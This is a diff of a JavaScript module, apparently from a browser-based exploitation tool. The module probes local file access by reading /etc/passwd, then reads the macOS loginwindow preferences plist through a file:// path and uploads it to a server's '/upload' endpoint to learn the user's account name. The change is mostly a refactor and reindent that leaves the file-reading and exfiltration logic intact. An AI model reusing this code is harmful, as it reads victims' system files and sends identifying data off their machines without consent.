@@ -1,12 +1,12 @@
 "use strict";
 
 
-define(["utils"], function() {
-
-    console.log('Module Setup: Filesytem');
+define(["utils"], function(utils) {
 
     return {
-
+    
+        utils: utils,
+    
         // Currently only detects unix-like file systems
         isFileSystemAccessbile: function(callbacks) {
             this.getFile('/etc/passwd', {
@@ -38,33 +38,31 @@ define(["utils"], function() {
         },
 
         getUsername: function(server, callbacks) {
-             var path = 'file:///Library/Preferences/com.apple.loginwindow.plist';
-             var _this = this;
-             this.getFile(path, {
-                 success: function(data) {
-                     console.log('Got plist data, uploading to server ...');
-                     _this.utils.POST('/upload', data, {
-                         success: function(username) {
-                             console.log('Username is: ' + username);
-                             if (callbacks.success) {
-                                 callbacks.success(username);
-                             }
-                         },
-                         failure: function() {
-                             console.log('Server failed to parse plist data');
-                             if (callbacks.failure) {
+            var path = 'file:///Library/Preferences/com.apple.loginwindow.plist';
+            var _this = this;
+            this.getFile(path, {
+                success: function(data) {
+                    console.log('Got plist data, uploading to server ...');
+                    _this.utils.POST('/upload', data, {
+                        success: function(username) {
+                            console.log('Username is: ' + username);
+                            if (callbacks.success) {
+                                callbacks.success(username);
+                            }
+                        },
+                        failure: function() {
+                            console.log('Server failed to parse plist data');
+                            if (callbacks.failure) {
                                 callbacks.failure();
-                             }
-                         }
-                     });
-                 },
-                 failure: function() {
-                     console.log('Failed to get file data for: ' + path);
-                     callbacks.failure();
-                 }
-             });
-        },        
-
+                            }
+                        }
+                    });
+                },
+                failure: function() {
+                    console.log('Failed to get file data for: ' + path);
+                    callbacks.failure();
+                }
+            });
+        }
     }
-
 });
